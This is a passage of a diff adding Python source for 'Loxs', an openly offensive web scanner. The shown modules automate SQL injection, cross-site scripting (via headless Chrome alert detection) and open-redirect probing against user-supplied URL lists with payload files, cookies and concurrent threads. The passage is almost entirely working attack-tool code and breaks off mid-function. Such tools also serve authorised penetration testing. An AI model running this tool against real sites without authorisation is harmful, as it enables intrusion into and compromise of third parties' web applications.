+                                return [single_url]
+                            else:
+                                print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
+                                input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
+                                clear_screen()
+                                print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho - Hghost010\n")
+                    except Exception as e:
+                        print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
+                        input(f"{Fore.YELLOW}[i] Press Enter to try again...")
+                        clear_screen()
+                        print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho - Hghost010\n")
+
+            def prompt_for_payloads():
+                while True:
+                    try:
+                        payload_input = get_file_path("[?] Enter the path to the payloads file: ")
+                        if not os.path.isfile(payload_input):
+                            raise FileNotFoundError(f"File not found: {payload_input}")
+                        with open(payload_input, 'r', encoding='utf-8') as f:
+                            payloads = [line.strip() for line in f if line.strip()]
+                        return payloads
+                    except Exception as e:
+                        print(f"{Fore.RED}[!] Error reading payload file: {payload_input}. Exception: {str(e)}")
+                        input(f"{Fore.YELLOW}[i] Press Enter to try again...")
+                        clear_screen()
+                        print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho - Hghost010\n")
+
+            def print_scan_summary(total_found, total_scanned, start_time):
+                summary = [
+                    "→ Scanning finished.",
+                    f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
+                    f"• Total scanned: {total_scanned}",
+                    f"• Time taken: {int(time.time() - start_time)} seconds"
+                ]
+                max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
+                border = "┌" + "─" * (max_length + 2) + "┐"
+                bottom_border = "└" + "─" * (max_length + 2) + "┘"
+                
+                print(Fore.YELLOW + f"\n{border}")
+                for line in summary:
+                    padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
+                    padding = max_length - len(padded_line)
+                    print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
+                print(Fore.YELLOW + bottom_border)
+
+            def main():
+                clear_screen()
+
+                panel = Panel(r"""                                                       
+                  ___                                         
+      _________ _/ (_)  ______________ _____  ____  ___  _____
+    / ___/ __ `/ / /  / ___/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
+   (__  ) /_/ / / /  (__  ) /__/ /_/ / / / / / / /  __/ /    
+  /____/\__, /_/_/  /____/\___/\__,_/_/ /_/_/ /_/\___/_/     
+            /_/                                                
+""",
+                style="bold green",
+                border_style="blue",
+                expand=False
+                )
+                rich_print(panel, "\n")
+
+                print(Fore.GREEN + "Welcome to the SQL Testing Tool!\n")
+
+                urls = prompt_for_urls()
+                payloads = prompt_for_payloads()
+                
+                cookie = input("[?] Enter the cookie to include in the GET request (press Enter if none): ").strip() or None
+
+                threads = int(input("[?] Enter the number of concurrent threads (0-10, press Enter for 5): ").strip() or 5)
+                print(f"\n{Fore.YELLOW}[i] Loading, Please Wait...")
+                clear_screen()
+                print(f"{Fore.CYAN}[i] Starting scan...\n")
+                vulnerable_urls = []
+                first_vulnerability_prompt = True
+
+                single_url_scan = len(urls) == 1
+                start_time = time.time()
+                total_scanned = 0
+                total_found = 0
+                    
+                get_random_user_agent()
+                try:
+                    if threads == 0:
+                        for url in urls:
+                            box_content = f" → Scanning URL: {url} "
+                            box_width = max(len(box_content) + 2, 40)
+                            print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
+                            print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
+                            print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
+                            for payload in payloads:
+                                success, url_with_payload, response_time, error_message, vulnerability_detected = perform_request(url, payload, cookie)
+
+                                if vulnerability_detected:
+                                    stripped_payload = url_with_payload.replace(url, '')
+                                    encoded_stripped_payload = quote(stripped_payload, safe='')
+                                    encoded_url = f"{url}{encoded_stripped_payload}"
+                                    if single_url_scan:
+                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
+                                        encoded_url_with_payload = encoded_url
+                                    else:
+                                        list_stripped_payload = url_with_payload
+                                        for u in urls:
+                                            list_stripped_payload = list_stripped_payload.replace(u, '')
+                                        encoded_stripped_payload = quote(list_stripped_payload, safe='')
+
+                                        encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)
+
+                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
+                                    print(f"{Fore.GREEN}[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
+                                    vulnerable_urls.append(url_with_payload)
+                                    total_found += 1
+                                    
+                                else:
+                                    stripped_payload = url_with_payload.replace(url, '')
+                                    encoded_stripped_payload = quote(stripped_payload, safe='')
+                                    encoded_url = f"{url}{encoded_stripped_payload}"
+                                    if single_url_scan:
+                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
+                                        encoded_url_with_payload = encoded_url
+                                    else:
+                                        list_stripped_payload = url_with_payload
+                                        for u in urls:
+                                            list_stripped_payload = list_stripped_payload.replace(u, '')
+                                        encoded_stripped_payload = quote(list_stripped_payload, safe='')
+
+                                        encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)
+
+                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
+                                    print(f"{Fore.RED}[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
+                                total_scanned += 1
+                                
+                    else:
+                        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+                            for url in urls:
+                                box_content = f" → Scanning URL: {url} "
+                                box_width = max(len(box_content) + 2, 40)
+                                print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
+                                print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
+                                print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
+                                
+                                futures = []
+                                for payload in payloads:
+                                    futures.append(executor.submit(perform_request, url, payload, cookie))
+
+                                for future in concurrent.futures.as_completed(futures):
+                                    success, url_with_payload, response_time, error_message, vulnerability_detected = future.result()
+
+                                    if vulnerability_detected:
+                                        stripped_payload = url_with_payload.replace(url, '')
+                                        encoded_stripped_payload = quote(stripped_payload, safe='')
+                                        encoded_url = f"{url}{encoded_stripped_payload}"
+                                        if single_url_scan:
+                                            print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
+                                            encoded_url_with_payload = encoded_url
+                                        else:
+                                            list_stripped_payload = url_with_payload
+                                            for u in urls:
+                                                list_stripped_payload = list_stripped_payload.replace(u, '')
+                                            encoded_stripped_payload = quote(list_stripped_payload, safe='')
+
+                                            encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)
+
+                                            print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
+                                        print(f"{Fore.GREEN}[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
+                                        vulnerable_urls.append(url_with_payload)
+                                        total_found += 1
+                                        if single_url_scan and first_vulnerability_prompt:
+                                            continue_scan = input(f"{Fore.CYAN}\n[?] Vulnerability found. Do you want to continue testing other payloads? (y/n, press Enter for n): ").strip().lower()
+                                            if continue_scan != 'y':
+                                                break
+                                            first_vulnerability_prompt = False
+
+                                    else:
+                                        stripped_payload = url_with_payload.replace(url, '')
+                                        encoded_stripped_payload = quote(stripped_payload, safe='')
+                                        encoded_url = f"{url}{encoded_stripped_payload}"
+                                        if single_url_scan:
+                                            print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
+                                            encoded_url_with_payload = encoded_url
+                                        else:
+                                            list_stripped_payload = url_with_payload
+                                            for u in urls:
+                                                list_stripped_payload = list_stripped_payload.replace(u, '')
+                                            encoded_stripped_payload = quote(list_stripped_payload, safe='')
+
+                                            encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)
+
+                                            print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
+                                        print(f"{Fore.RED}[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
+                                    total_scanned += 1
+
+                    print_scan_summary(total_found, total_scanned, start_time)
+                    save_results(vulnerable_urls, total_found, total_scanned, start_time)
+                except Exception as e:
+                    print(f"{Fore.RED}An error occurred: {str(e)}")
+                finally:
+                    if 'executor' in locals():
+                        executor.shutdown(wait=False)
+                    sys.exit(0)
+
+            if __name__ == "__main__":
+                try:
+                    main()
+                except KeyboardInterrupt:
+                    sys.exit(0)
+
+
+    def run_xss_scanner(scan_state=None):
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        logging.getLogger('WDM').setLevel(logging.ERROR)
+        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+        console = Console()
+
+        driver_pool = Queue()
+        driver_lock = Lock()
+
+        def load_payloads(payload_file):
+            try:
+                with open(payload_file, "r") as file:
+                    return [line.strip() for line in file if line.strip()]
+            except Exception as e:
+                print(Fore.RED + f"[!] Error loading payloads: {e}")
+                exit()
+
+        def generate_payload_urls(url, payload):
+            url_combinations = []
+            scheme, netloc, path, query_string, fragment = urlsplit(url)
+            if not scheme:
+                scheme = 'http'
+            
+            query_params = parse_qs(query_string, keep_blank_values=True)
+            for key in query_params.keys():
+                modified_params = query_params.copy()
+                modified_params[key] = [payload]
+                modified_query_string = urlencode(modified_params, doseq=True)
+                modified_url = urlunsplit((scheme, netloc, path, modified_query_string, fragment))
+                url_combinations.append(modified_url)
+            
+            if fragment:
+                if '=' in fragment:
+                    fragment_params = parse_qs(fragment, keep_blank_values=True)
+                    for key in fragment_params.keys():
+                        modified_fragment_params = fragment_params.copy()
+                        modified_fragment_params[key] = [payload]
+                        modified_fragment_string = urlencode(modified_fragment_params, doseq=True)
+                        modified_url = urlunsplit((scheme, netloc, path, query_string, modified_fragment_string))
+                        url_combinations.append(modified_url)
+                else:
+                    modified_url = urlunsplit((scheme, netloc, path, query_string, payload))
+                    url_combinations.append(modified_url)
+            
+            if not query_params and not fragment:
+                new_query = urlencode({'test': payload})
+                modified_url = urlunsplit((scheme, netloc, path, new_query, fragment))
+                url_combinations.append(modified_url)
+                
+                modified_url_fragment = urlunsplit((scheme, netloc, path, query_string, payload))
+                url_combinations.append(modified_url_fragment)
+            
+            return url_combinations
+
+        def create_driver():
+            chrome_options = Options()
+            chrome_options.add_argument("--headless")
+            chrome_options.add_argument("--no-sandbox")
+            chrome_options.add_argument("--disable-dev-shm-usage")
+            chrome_options.add_argument("--disable-extensions")
+            chrome_options.add_argument("--disable-browser-side-navigation")
+            chrome_options.add_argument("--disable-infobars")
+            chrome_options.add_argument("--disable-notifications")
+            chrome_options.page_load_strategy = 'eager'
+            logging.disable(logging.CRITICAL)
+            
+
+            driver_service = Service(ChromeDriverManager().install())
+            return webdriver.Chrome(service=driver_service, options=chrome_options)
+
+        def get_driver():
+            try:
+                return driver_pool.get_nowait()
+            except:
+                with driver_lock:
+                    return create_driver()
+
+        def return_driver(driver):
+            driver_pool.put(driver)
+
+        def check_vulnerability(url, payload, vulnerable_urls, total_scanned, timeout, scan_state):
+            driver = get_driver()
+            try:
+                payload_urls = generate_payload_urls(url, payload)
+                if not payload_urls:
+                    return
+
+                for payload_url in payload_urls:
+                    try:
+                        driver.get(payload_url)
+                        
+                        total_scanned[0] += 1
+                        
+                        try:
+                            alert = WebDriverWait(driver, timeout).until(EC.alert_is_present())
+                            alert_text = alert.text
+
+                            if alert_text:
+                                result = Fore.GREEN + f"[✓]{Fore.CYAN} Vulnerable:{Fore.GREEN} {payload_url} {Fore.CYAN} - Alert Text: {alert_text}"
+                                print(result)
+                                vulnerable_urls.append(payload_url)
+                                if scan_state:
+                                    scan_state['vulnerability_found'] = True
+                                    scan_state['vulnerable_urls'].append(payload_url)
+                                    scan_state['total_found'] += 1
+                                alert.accept()
+                            else:
+                                result = Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable:{Fore.RED} {payload_url}"
+                                print(result)
+
+                        except TimeoutException:
+                            print(Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable:{Fore.RED} {payload_url}")
+
+                    except UnexpectedAlertPresentException:
+                        pass
+            finally:
+                return_driver(driver)
+
+
+
+        def run_scan(urls, payload_file, timeout, scan_state):
+            payloads = load_payloads(payload_file)
+            vulnerable_urls = []
+            total_scanned = [0]
+            
+            for _ in range(3):
+                driver_pool.put(create_driver())
+            
+            try:
+                with ThreadPoolExecutor(max_workers=2) as executor:
+                    futures = []
+                    for url in urls:
+                        for payload in payloads:
+                            futures.append(
+                                executor.submit(
+                                    check_vulnerability,
+                                    url,
+                                    payload,
+                                    vulnerable_urls,
+                                    total_scanned,
+                                    timeout,
+                                    scan_state
+                                )
+                            )
+                    
+                    for future in as_completed(futures):
+                        try:
+                            future.result(timeout)
+                        except Exception as e:
+                            print(Fore.RED + f"[!] Error during scan: {e}")
+                            
+            finally:
+                while not driver_pool.empty():
+                    driver = driver_pool.get()
+                    driver.quit()
+                    
+                return vulnerable_urls, total_scanned[0]
+
+        def print_scan_summary(total_found, total_scanned, start_time):
+            summary = [
+                "→ Scanning finished.",
+                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
+                f"• Total scanned: {total_scanned}",
+                f"• Time taken: {int(time.time() - start_time)} seconds"
+            ]
+            for line in summary:
+                print(Fore.YELLOW + line)
+
+        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
+            action = input(Fore.CYAN + "[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
+            if action == 'y':
+                html_content = generate_html_report("Cross-Site Scripting (XSS)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
+                
+                filename = input(Fore.CYAN + "[?] Enter the filename for the HTML report or press Enter to use 'xssreport.html': ").strip()
+                if not filename:
+                    filename = 'xssreport.html'
+                    print(Fore.YELLOW + "[i] No filename provided. Using 'xssreport.html'.")
+
+                print(f"DEBUG: Chosen filename: '{filename}'")
+                
+                report_file = save_html_report(html_content, filename)
+            else:
+                print(Fore.RED + "\nExiting...")
+                exit()
+
+        def get_file_path(prompt_text):
+            completer = PathCompleter()
+            return prompt(prompt_text, completer=completer).strip()
+
+        def prompt_for_urls():
+            while True:
+                try:
+                    url_input = get_file_path("[?] Enter the path to the input file containing URLs (or press Enter to enter a single URL): ")
+                    if url_input:
+                        if not os.path.isfile(url_input):
+                            raise FileNotFoundError(f"File not found: {url_input}")
+                        with open(url_input) as file:
+                            urls = [line.strip() for line in file if line.strip()]
+                        return urls
+                    else:
+                        single_url = input(Fore.CYAN + "[?] Enter a single URL to scan: ").strip()
+                        if single_url:
+                            return [single_url]
+                        else:
+                            print(Fore.RED + "[!] You must provide either a file with URLs or a single URL.")
+                            input(Fore.YELLOW + "\n[i] Press Enter to try again...")
+                            clear_screen()
+                            print(Fore.GREEN + "Welcome to the XSS Scanner!\n")
+                except Exception as e:
+                    print(Fore.RED + f"[!] Error reading the input file. Exception: {str(e)}")
+                    input(Fore.YELLOW + "[i] Press Enter to try again...")
+                    clear_screen()
+                    print(Fore.GREEN + "Welcome to the XSS Scanner!\n")
+
+
+        def prompt_for_valid_file_path(prompt_text):
+            while True:
+                file_path = get_file_path(prompt_text).strip()
+                if not file_path:
+                    print(Fore.RED + "[!] You must provide a file containing the payloads.")
+                    input(Fore.YELLOW + "[i] Press Enter to try again...")
+                    clear_screen()
+                    print(Fore.GREEN + "Welcome to the XSS Scanner!\n")
+                    continue
+                if os.path.isfile(file_path):
+                    return file_path
+                else:
+                    print(Fore.RED + "[!] Error reading the input file.")
+                    input(Fore.YELLOW + "[i] Press Enter to try again...")
+                    clear_screen()
+                    print(Fore.GREEN + "Welcome to the XSS Scanner!\n")
+
+        def main():
+            clear_screen()
+            panel = Panel(r"""
+    _  __________  ____________   _  ___  __________
+   | |/_/ __/ __/ / __/ ___/ _ | / |/ / |/ / __/ _  |
+   >  <_\ \_\ \  _\ \/ /__/ __ |/    /    / _// , _/
+  /_/|_/___/___/ /___/\___/_/ |_/_/|_/_/|_/___/_/|_|  
+                """,
+                        style="bold green",
+                        border_style="blue",
+                        expand=False
+                    )
+
+            console.print(panel, "\n")
+            print(Fore.GREEN + "Welcome to the XSS Testing Tool!\n")
+            urls = prompt_for_urls()
+
+            payload_file = prompt_for_valid_file_path("[?] Enter the path to the payloads file: ")
+            
+            try:
+                timeout = float(input(Fore.CYAN + "Enter the timeout duration for each request (Press Enter for 0.5): "))
+            except ValueError:
+                timeout = 0.5
+
+            clear_screen()
+            print(f"{Fore.CYAN}[i] Starting scan...\n")
+
+            scan_state = {'vulnerability_found': False, 'total_found': 0, 'vulnerable_urls': []}
+            all_vulnerable_urls = []
+            total_scanned = 0
+            start_time = time.time()
+
+            try:
+                for url in urls:
+                    box_content = f" → Scanning URL: {url} "
+                    box_width = max(len(box_content) + 2, 40)
+                    print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
+                    print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
+                    print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
+
+                    vulnerable_urls, scanned = run_scan([url], payload_file, timeout, scan_state)
+                    all_vulnerable_urls.extend(vulnerable_urls)
+                    total_scanned += scanned
+
+            except KeyboardInterrupt:
+                print(Fore.RED + "\n[!] Scan interrupted by the user.")
+                print_scan_summary(scan_state['total_found'], total_scanned, start_time)
+                save_results(scan_state['vulnerable_urls'], scan_state['total_found'], total_scanned, start_time)
+                exit()
+
+            print_scan_summary(scan_state['total_found'], total_scanned, start_time)
+            save_results(scan_state['vulnerable_urls'], scan_state['total_found'], total_scanned, start_time)
+            exit()
+
+
+        if __name__ == "__main__":
+            try:
+                main()
+            except KeyboardInterrupt:
+                print(Fore.RED + "\n[!] Scan interrupted by the user. Exiting...")
+                sys.exit()
+
+
+    def run_or_scanner(scan_state=None):
+            
+
+        init()
+
+        scan_active = True
+        executor = None
+        drivers = []            
+            
+            
+        def get_chrome_driver():
+            if not scan_active:
+                return None
+                
+            chrome_options = Options()
+            chrome_options.add_argument("--headless")
+            chrome_options.add_argument("--disable-dev-shm-usage")
+            chrome_options.add_argument("--window-size=1920,1080")
+            chrome_options.add_argument("--no-sandbox")
+            chrome_options.add_argument("--disable-dev-shm-usage")
+            chrome_options.add_argument("--disable-gpu")
+            chrome_options.add_argument("--disable-extensions")
+            chrome_options.add_argument("--disable-dev-shm-usage")
+            chrome_options.add_argument("--disable-browser-side-navigation")
+            chrome_options.add_argument("--disable-infobars")
+            chrome_options.add_argument("--disable-notifications")
+            chrome_options.page_load_strategy = 'eager'
+            logging.disable(logging.CRITICAL)
+
+            service = Service(ChromeDriverManager().install())
+            driver = webdriver.Chrome(service=service, options=chrome_options)
+            driver.set_page_load_timeout(15)
+            drivers.append(driver)
+            return driver
+
+
+        def check_payload_with_selenium(url, payload, param_name=None):
+            if not scan_active:
+                return False
+                
+            driver = None
+            try:
+                driver = get_chrome_driver()
+                if not driver:
+                    return False
+                    
+                print(Fore.YELLOW + f"[→] Testing {param_name if param_name else 'path'}: {Fore.CYAN}{url}")
+                
+                driver.get(url)
+                WebDriverWait(driver, 10).until(
+                    lambda d: d.execute_script('return document.readyState') == 'complete'
+                )
+                
+                current_url = driver.current_url.lower()
+                
+                if "google.com" in current_url:
+                    if current_url.startswith("https://google.com") or "google.com" in current_url.split("/")[2]: 
+                        if scan_state:
+                            scan_state['vulnerability_found'] = True
+                            scan_state['vulnerable_urls'].append(url)
+                            scan_state['total_found'] += 1
+                        print(Fore.GREEN + f"[✓] Vulnerable: {url}")
+                        return True
+                    else:
+                        print(Fore.RED + f"[✗] Not Vulnerable: {url}")
+                else:
+                    print(Fore.RED + f"[✗] Not Vulnerable: {url}")
+                
+            except Exception as e:
+                if scan_active:
+                    print(Fore.RED + f"[!] Error: {str(e)}")
+                return False
+            finally:
+                if driver and driver in drivers:
+                    try:
+                        driver.quit()
+                        drivers.remove(driver)
+                    except:
+                        pass
+            
+            return False
+
+        def test_open_redirect(url, payloads, max_threads=5):
+            nonlocal scan_active, executor
+            found_vulnerabilities = 0
+            vulnerable_urls = []
+            
+            parsed = urllib.parse.urlparse(url)
+            print(Fore.MAGENTA + f"[i] Parsed URL: {parsed}")
+            
+            if not parsed.scheme:
+                url = 'http://' + url
+                parsed = urllib.parse.urlparse(url)
+            
+            try:
+                if not parsed.query:
+                    print(Fore.YELLOW + "[i] No query parameters found. Testing path instead.")
+                    path = parsed.path
+                    
+                    executor = ThreadPoolExecutor(max_workers=max_threads)
+                    futures = []
+                    
+                    for payload in payloads:
+                        if not scan_active:
+                            break
+                            
+                        payload = payload.strip()
+                        if not payload:
+                            continue
+                        
+                        test_url = parsed._replace(path=path + payload)
+                        
+                        futures.append(
+                            executor.submit(
+                                check_payload_with_selenium,
+                                url=urllib.parse.urlunparse(test_url),
+                                payload=payload,
+                                param_name='path'
+                            )
+                        )
+                    
+                    for future in as_completed(futures):
+                        if not scan_active:
+                            break
+                        try:
+                            if future.result():
+                                found_vulnerabilities += 1
+                                vulnerable_urls.append(urllib.parse.urlunparse(test_url))
+                        except Exception as e:
+                            if scan_active:
+                                print(Fore.RED + f"[!] Error testing path: {str(e).splitlines()[0]}")
+                    
+                else:
+                    query_params = {}
+                    for param in parsed.query.split('&'):
+                        if '=' in param:
+                            key, value = param.split('=', 1)
+                            query_params[key] = [value]
+                        else:
+                            query_params[param] = ['']
+                    
+                    print(Fore.YELLOW + f"\n[i] Query Params: {query_params}")
+                    print(Fore.GREEN + f"\n[i] Found parameters: {', '.join(query_params.keys())}")
+                    
+                    executor = ThreadPoolExecutor(max_workers=max_threads)
+                    futures = []
+                    
+                    for payload in payloads:
+                        if not scan_active:
+                            break
+                            
+                        payload = payload.strip()
+                        if not payload:
+                            continue
+                        
+                        for param in query_params:
+                            if not scan_active:
+                                break
+                                
+                            modified_params = query_params.copy()
+                            modified_params[param] = [payload]
+                            
+                            test_url = urllib.parse.urlunparse(
+                                parsed._replace(
+                                    query=urllib.parse.urlencode(modified_params, doseq=True)
+                                )
+                            )
+                            
+                            futures.append(
+                                executor.submit(
+                                    check_payload_with_selenium, 
+                                    test_url, 
+                                    payload, 
+                                    param
+                                )
+                            )
+                    
+                    for future in as_completed(futures):
+                        if not scan_active:
+                            break
+                        try:
+                            if future.result():
+                                found_vulnerabilities += 1
+                                vulnerable_urls.append(test_url)
+                        except Exception as e:
+                            if scan_active:
+                                print(Fore.RED + f"[!] Error testing parameter: {str(e).splitlines()[0]}")
+            
+
+            except KeyboardInterrupt:
+                print(Fore.MAGENTA + "\nPlease wait, cleaning up resources...")
+                scan_active = False
+                stop_event.set()
+
+                for driver in drivers:
+                    try:
+                        driver.quit()
+                    except:
+                        pass
+                drivers.clear()
+
+                if executor is not None:
+                    executor.shutdown(wait=False, cancel_futures=True)
+                    
+                print(Fore.YELLOW + "[!] Scan interrupted by user.")
+
+                if scan_state and scan_state.get('vulnerability_found', False):
+                    print(Fore.GREEN + f"\n[+] Partial results - Vulnerabilities found: {scan_state.get('total_found', 0)}")
+                    if scan_state.get('vulnerable_urls'):
+                        print(Fore.GREEN + "[+] Vulnerable URLs:")
+                        for url in scan_state['vulnerable_urls']:
+                            print(Fore.GREEN + f"    {url}")
+                else:
+                    print(Fore.YELLOW + "\n[-] Scan cancelled before completion")
+                raise KeyboardInterrupt
+
+
+            finally:
+
+                if executor is not None:
+                    executor.shutdown(wait=False)
+                for driver in drivers:
+                    try:
+                        driver.quit()
+                    except:
+                        pass
+                drivers.clear()
+
+            return found_vulnerabilities, vulnerable_urls
+
+        def get_file_path(prompt_text):
+            if not scan_active:
+                return None
+            completer = PathCompleter()
+            try:
+                return prompt(prompt_text, completer=completer).strip()
+            except:
+                return None
+
+        def prompt_for_urls():
+            while scan_active:
+                try:
+                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
+                    if not scan_active:
+                        return None
+                        
+                    if url_input is None:
+                        return None
+                        
+                    if url_input:
+                        if not os.path.isfile(url_input):
+                            print(Fore.RED + f"[!] File not found: {url_input}")
+                            continue
+                        with open(url_input) as file:
+                            urls = [line.strip() for line in file if line.strip()]
+                        return urls
+                    else:
+                        single_url = input(Fore.BLUE + "[?] Enter a single URL to scan: ").strip()
+                        if single_url:
+                            return [single_url]
+                        print(Fore.RED + "[!] You must provide either a file with URLs or a single URL")
+                except Exception as e:
+                    print(Fore.RED + f"[!] Error: {str(e)}")
+                    if not scan_active:
+                        return None
+                    if input(Fore.YELLOW + "[i] Press Enter to try again or 'q' to quit: ").strip().lower() == 'q':
+                        return None
+
+        def prompt_for_payloads():
+            while scan_active:
+                try:
+                    payload_input = get_file_path("[?] Enter the path to the payloads file: ")
+                    if not scan_active:
+                        return None
+                        
+                    if payload_input is None:
+                        return None
+                        
+                    if not os.path.isfile(payload_input):
+                        print(Fore.RED + f"[!] File not found: {payload_input}")
+                        continue
+                    with open(payload_input, 'r', encoding='utf-8') as f:
+                        payloads = [line.strip() for line in f if line.strip()]
+                    return payloads
+                except Exception as e:
+                    print(Fore.RED + f"[!] Error: {str(e)}")
+                    if not scan_active:
+                        return None
+                    if input(Fore.YELLOW + "[i] Press Enter to try again or 'q' to quit: ").strip().lower() == 'q':
+                        return None
+
+        def print_scan_summary(total_found, total_scanned, start_time):
+            summary = [
+                "→ Scanning finished.",
+                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
+                f"• Total scanned: {total_scanned}",
+                f"• Time taken: {int(time.time() - start_time)} seconds"
+            ]
+            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
+            border = "┌" + "─" * (max_length + 2) + "┐"
+            bottom_border = "└" + "─" * (max_length + 2) + "┘"
+
+            print(Fore.YELLOW + f"\n{border}")
+            for line in summary:
+                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
+                padding = max_length - len(padded_line)
+                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
+            print(Fore.YELLOW + bottom_border)
+
+        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
+            if not scan_active:
+                return
+                
+            if vulnerable_urls:
+                try:
+                    generate_report = input(f"{Fore.CYAN}\n[?] Vulnerabilities found! Generate HTML report? (y/n): ").strip().lower()
+                    if generate_report == 'y':
+                        html_content = generate_html_report("Open Redirect (OR)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
+                        filename = input(f"{Fore.CYAN}[?] Enter filename (or press Enter for default): ").strip()
+                        if not filename:
+                            filename = f"open_redirect_report_{int(time.time())}.html"
+                        report_file = save_html_report(html_content, filename)
+                        if report_file:
+                            print(Fore.GREEN + f"[✓] Report saved to: {report_file}")
+                except:
+                    pass
+            elif total_scanned > 0:
+                print(Fore.YELLOW + "\n[i] No vulnerabilities found.")
+            else:
+                print(Fore.RED + "[!] No URLs were scanned.")
+
+        clear_screen()
+
+        panel = Panel(r"""
+   ____  ___    ____________   _  ___  __________
+  / __ \/ _ \  / __/ ___/ _ | / |/ / |/ / __/ _  |
+ / /_/ / , _/ _\ \/ /__/ __ |/    /    / _// , _/
+/____//_/|_| /___/\___/_/ |_/_/|_/_/|_/___/_/|_| 
+            
+                            """,
+            style="bold green",
+            border_style="blue",
+            expand=False
+        )
+        rich_print(panel, "\n")
+        print(Fore.GREEN + "Welcome to the Open Redirect Testing Tool!\n")
+
+        try:
+            urls = prompt_for_urls()
+            payloads = prompt_for_payloads()
+
+            max_threads_input = input("[?] Enter the number of concurrent threads (0-10, press Enter for 5): ").strip()
+            max_threads = int(max_threads_input) if max_threads_input.isdigit() and 0 <= int(max_threads_input) <= 10 else 5
+
+            print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
+            clear_screen()
+            print(Fore.CYAN + "[i] Starting scan...\n")
+
+            total_found = 0
+            total_scanned = 0
+            start_time = time.time()
+            vulnerable_urls = []
+
+            if scan_state is None:
+                scan_state = {
+                    'vulnerability_found': False,
+                    'vulnerable_urls': [],
+                    'total_found': 0,
+                    'total_scanned': 0
+                }
+
+            if payloads:
+                for url in urls:
+                    current_scan_state = {
+                        'vulnerability_found': False,
+                        'vulnerable_urls': [],
+                        'total_found': 0,
+                        'total_scanned': 0
+                    }
+                    
+                    box_content = f" → Scanning URL: {url} "
+                    box_width = max(len(box_content) + 2, 40)
+                    print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
+                    print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
+                    print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n\n")
+                    
+                    found, urls_with_payloads = test_open_redirect(url, payloads, max_threads)
+                    total_found += found
+                    total_scanned += len(payloads)
+                    vulnerable_urls.extend(urls_with_payloads)
+
+                    scan_state['vulnerability_found'] |= current_scan_state['vulnerability_found']
+                    scan_state['vulnerable_urls'].extend(current_scan_state['vulnerable_urls'])
+                    scan_state['total_found'] += current_scan_state['total_found']
+                    scan_state['total_scanned'] += current_scan_state['total_scanned']
+
+            print_scan_summary(total_found, total_scanned, start_time)
+            save_results(vulnerable_urls, total_found, total_scanned, start_time)
+
+            if scan_state['vulnerability_found']:
+                print(Fore.GREEN + f"\n[+] Vulnerabilities found: {scan_state['total_found']}")
